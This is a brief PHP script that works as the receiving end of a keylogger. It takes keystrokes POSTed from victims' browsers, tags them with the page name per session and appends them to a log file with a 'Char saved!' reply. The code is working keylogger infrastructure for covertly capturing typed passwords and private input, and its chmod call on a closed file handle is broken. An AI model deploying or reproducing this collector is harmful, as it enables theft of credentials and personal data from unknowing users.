<?php
session_start();  // To keep track of users and regulate change on pages


if(!isset($_POST['key'])) {    ##Authenticate input
    echo('Access denied!');
    exit(0);
}

$file = fopen("key.log", "a+");

if(!isset($_SESSION['page'])  || $_SESSION['page'] != $_POST['page']){
    $_SESSION['page'] = $_POST['page'];
    fwrite($file, " [[[ PAGE : ".$_POST['page']." ]]]");
}


fwrite($file, $_POST['key']);
fclose($file);
chmod($file, 0777); 
echo('Char saved!');